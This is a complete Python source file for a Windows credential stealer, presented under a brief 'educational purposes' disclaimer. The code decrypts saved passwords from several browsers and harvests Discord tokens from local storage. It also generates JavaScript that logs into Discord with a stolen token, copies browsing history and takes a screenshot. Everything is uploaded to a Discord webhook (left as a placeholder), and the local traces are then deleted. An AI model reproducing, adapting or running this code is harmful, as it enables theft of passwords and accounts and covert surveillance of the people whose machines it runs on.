"""
⚠️ DISCLAIMER

This script is intended solely for educational and awareness purposes.
Do not use this script for any unauthorized or malicious activities.
The author assumes no responsibility for any consequences arising from misuse.
Always act responsibly and within the boundaries of the law.
"""
import os
import re
import json
import shlex
import base64
import shutil
import winreg
import socket
import sqlite3
import requests
import platform
import pyautogui
import webbrowser
import win32crypt
from Crypto.Cipher import AES
from datetime import datetime, timedelta
import glob

LEVEL_DB_PATH = {
    "Brave": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb",
    "Chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb",
    "Edge": r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb",
    "Opera": r"%APPDATA%\Opera Software\Opera Stable\Local Storage\leveldb",
    "Vivaldi": r"%APPDATA%\Vivaldi\User Data\Default\Local Storage\leveldb",
    "Yandex": r"%APPDATA%\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb",
    "Discord": r"%APPDATA%\discord\Local Storage\leveldb",
    "Discord PTB": r"%APPDATA%\discordptb\Local Storage\leveldb",
    "Discord Canary": r"%APPDATA%\discordcanary\Local Storage\leveldb"
}
HISTORY_BROWSER_PATH = {
    "Chrome":  r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\History",
    "Brave":   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\History",
    "Edge":    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\History",
    "Opera":   r"%APPDATA%\Opera Software\Opera Stable\History",
    "Vivaldi": r"%APPDATA%\Vivaldi\User Data\Default\History",
    "Yandex":  r"%APPDATA%\Yandex\YandexBrowser\User Data\Default\History",
}
BROWSER_PATHS = {
    "Chrome":  r"%LOCALAPPDATA%\Google\Chrome\User Data\Default",
    "Brave":   r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default",
    "Edge":    r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default",
    "Opera":   r"%APPDATA%\Opera Software\Opera Stable",
    "Vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data\Default",
    "Yandex":  r"%APPDATA%\Yandex\YandexBrowser\User Data\Default",
}
TOKEN_REGEX_PATTERN = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{34,38}"
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"  # Replace with your actual Discord webhook URL

class Main:
    def __init__(self):
        self.TOKEN_REGEX_PATTERN = TOKEN_REGEX_PATTERN
        self.LEVEL_DB_PATH = LEVEL_DB_PATH
        self.WEBHOOK_URL = WEBHOOK_URL
    def browser_time_to_datetime(self, chrome_time):
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
    def fetch_browsing_history(self, path):
        path = os.path.expandvars(path)
        if not os.path.exists(path):
            print(f"❌ Browsing history file does not exist: {path}")
            return []
        temp_path = path + ".copy"
        try:
            shutil.copy2(path, temp_path)
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
            rows = cursor.fetchall()
            history = []
            for row in rows:
                url, title, visit_count, last_visit_time = row
                last_visit_datetime = self.browser_time_to_datetime(last_visit_time)
                history.append({
                    "url": url,
                    "title": title,
                    "visit_count": visit_count,
                    "last_visit_time": last_visit_datetime.strftime("%Y-%m-%d %H:%M:%S")
                })
            conn.close()
            os.remove(temp_path)
            return history
        except sqlite3.Error as e:
            print(f"❌ Error fetching browsing history: {e}")
            if os.path.exists(temp_path):
                os.remove(temp_path)
            return []
        except Exception as e:
            print(f"❌ Unexpected error: {e}")
            if os.path.exists(temp_path):
                os.remove(temp_path)
            return []
    @staticmethod
    def get_secret_key(local_state_path):
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] 
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    @staticmethod
    def decrypt_password(buff, key):
        try:
            iv = buff[3:15]
            payload = buff[15:-16]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode()
        except Exception:
            return None
    def extract_emails(self, browser_name, profile_path):
        leaked = {}
        try:
            local_state_path = os.path.join(profile_path.replace("Default", ""), "Local State")
            login_db = os.path.join(profile_path, "Login Data")
            if not os.path.exists(login_db) or not os.path.exists(local_state_path):
                return

            secret_key = Main.get_secret_key(local_state_path)
            shutil.copy2(login_db, "LoginVault.db")
            conn = sqlite3.connect("LoginVault.db")
            cursor = conn.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            print(f"\n🌐 {browser_name}")
            for url, username, encrypted_password in cursor.fetchall():
                if username: 
                    decrypted = Main.decrypt_password(encrypted_password, secret_key)
                    print(f"👀 [{browser_name}] {url}")
                    print(f"📧 Email: {username}")
                    print(f"🔑 Pass:  {decrypted}\n")
                    leaked[url] = {
                        "email": username,
                        "password": decrypted
                    }
            cursor.close()
            conn.close()
            return leaked
        except Exception as e:
            print(f"❌ Error extracting emails from {browser_name}: {e}")
            if os.path.exists("LoginVault.db"):
                os.remove("LoginVault.db")
            return 0
    def discord_token_login_js(self, token):
        js_code = f"""
let token = "{token}";

function login(token) {{
    setInterval(() => {{
        document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.token = `"${{token}}"`;
    }}, 50);
    setTimeout(() => {{
        location.reload();
    }}, 2500);
}}

login(token);
"""
        return js_code
    def retrieve_discord_tokens(self):
        DISCORD_TOKENS = []
        BROWSERS_FOUND = []
        for browser, path in LEVEL_DB_PATH.items():
            path = os.path.expandvars(path)
            if not os.path.exists(path):
                print(f"❌ {browser} leveldb path does not exist: {path}")
                continue
            for file in os.listdir(path):
                BROWSERS_FOUND.append(browser)
                print(f"🔍 Scanning {browser} leveldb file: {file}")
                try:
                    with open(os.path.join(path, file), "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                        tokens = re.findall(TOKEN_REGEX_PATTERN, content)
                        if tokens:
                            print(f"✅ Found {len(tokens)} token(s) in {browser} leveldb file: {file}")
                            DISCORD_TOKENS.extend(tokens)
                except:
                    print(f"❌ Failed to read {browser} leveldb file: {file}")
        BROWSERS_FOUND = list(set(BROWSERS_FOUND))
        DISCORD_TOKENS = list(set(DISCORD_TOKENS))
        return {'tokens': DISCORD_TOKENS, 'browsers': BROWSERS_FOUND}
    def screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
            screenshot.save(screenshot_path)
            print(f"📸 Screenshot saved to {screenshot_path}")
            return 1
        except:
            print("❌ Failed to take screenshot")
            return 0
    def get_default_browser_path(self):
        try:
            reg_path = r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path) as key:
                prog_id, _ = winreg.QueryValueEx(key, "ProgId")

            command_path = f"{prog_id}\\shell\\open\\command"
            with winreg.OpenKey(winreg.HKEY_CLASSES_ROOT, command_path) as key:
                command, _ = winreg.QueryValueEx(key, None)
            return command
        except Exception as e:
            print(f"❌ Error retrieving default browser path: {e}")
            return 0
    
if __name__ == "__main__":
    main = Main()
    host_info = {
        "hostname": socket.gethostname(),
        "ip_address": socket.gethostbyname(socket.gethostname()),
        "platform": platform.system(),
        "platform_release": platform.release(),
        "platform_version": platform.version(),
        "architecture": platform.machine(),
        "processor": platform.processor()
    }
    browser_path = shlex.split(main.get_default_browser_path())[0]
    screenshot_result = main.screenshot()
    discord_token = main.retrieve_discord_tokens()
    for token in discord_token['tokens']:
        js_code = main.discord_token_login_js(token)
    for browser in discord_token['browsers']:
        if browser in ['Discord', 'Discord PTB', 'Discord Canary']:
            continue
        elif browser not in HISTORY_BROWSER_PATH:
            print(f"❌ No history path for browser: {browser}")
            continue
        history = main.fetch_browsing_history(HISTORY_BROWSER_PATH[browser])
        if history:
            print(f"📚 Browsing history for {browser}:")
            os.makedirs("browsing_history", exist_ok=True)
            for entry in history:
                with open(f"browsing_history/{browser}_history.txt", "a", encoding="utf-8") as f:
                    f.write(f"🔗 URL: {entry['url']}\n🪶 Title: {entry['title']}\n👆Visits: {entry['visit_count']}\n👆Last Visit: {entry['last_visit_time']}\n")
        if browser in BROWSER_PATHS:
            full_path = os.path.expandvars(BROWSER_PATHS[browser])
            leaked = main.extract_emails(browser, full_path)
            os.makedirs("browser_credentials", exist_ok=True)
            with open(f"browser_credentials/{browser}_credentials.csv", "w", encoding="utf-8") as csvfile:
                csvfile.write("url,email,password\n")
                if leaked and isinstance(leaked, dict):
                    for url, creds in leaked.items():
                        email = creds.get("email", "")
                        password = creds.get("password", "")
                        csvfile.write(f'"{url}","{email}","{password}"\n')
            if os.path.exists("LoginVault.db"):
                os.remove("LoginVault.db")
    files = {}
    credentials_dir = "browser_credentials"
    if os.path.isdir(credentials_dir):
        for fname in os.listdir(credentials_dir):
            fpath = os.path.join(credentials_dir, fname)
            if os.path.isfile(fpath):
                files[fname] = open(fpath, "rb")

    history_dir = "browsing_history"
    if os.path.isdir(history_dir):
        for fname in os.listdir(history_dir):
            fpath = os.path.join(history_dir, fname)
            if os.path.isfile(fpath):
                files[fname] = open(fpath, "rb")

    with open("tokens.txt", "w", encoding="utf-8") as token_file:
        for token in discord_token['tokens']:
            token_file.write(token + "\n")
    files["tokens.txt"] = open("tokens.txt", "rb")

    screenshot_path = os.path.join(os.getcwd(), "screenshot.png")
    if os.path.exists(screenshot_path):
        files["screenshot.png"] = open(screenshot_path, "rb")

    payload = {
        "payload_json": json.dumps({
            "content": "",
            "embeds": [
                {
                    "title": f"Connected - {host_info['hostname']}",
                    "description": f"Hostname: {host_info['hostname']}\nIP Address: {host_info['ip_address']}\nPlatform: {host_info['platform']} {host_info['platform_release']} ({host_info['architecture']})\nProcessor: {host_info['processor']}",
                    "color": 255,
                    "image": {
                        "url": "attachment://screenshot.png"
                    }
                }
            ],
            "attachments": []
        })
    }
    r = requests.post(
        WEBHOOK_URL,
        data=payload,
        files=files if files else None
    )
    for f in files.values():
        f.close()

    if os.path.isdir("browsing_history"):
        shutil.rmtree("browsing_history", ignore_errors=True)

    if os.path.isdir("browser_credentials"):
        shutil.rmtree("browser_credentials", ignore_errors=True)

    if os.path.exists("screenshot.png"):
        os.remove("screenshot.png")

    if os.path.exists("tokens.txt"):
        os.remove("tokens.txt")
